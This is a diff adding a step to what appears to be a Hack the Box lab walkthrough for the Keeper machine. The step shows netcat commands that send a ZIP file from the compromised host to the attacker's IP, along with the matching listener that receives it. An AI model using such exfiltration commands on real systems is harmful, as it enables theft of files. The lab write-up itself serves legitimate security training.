@@ -25,3 +25,19 @@ Dashboard
 
 SSH
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b612ec6c-ad5c-4eab-8ffe-1278d26e3cf9)
+
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f50378d9-1cdc-4a82-9759-03579c745ba9)
+
+Sending the ZIP file:
+```
+nc -N 10.10.14.61 9090 < RT30000.zip
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/93b150a1-152b-40f1-aa39-af4065c1e762)
+
+Receiving the ZIP file:
+```
+nc -l -p 9090 > keeper.zip
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8b230c17-acee-4527-9086-cb9e3185991a)
+
+
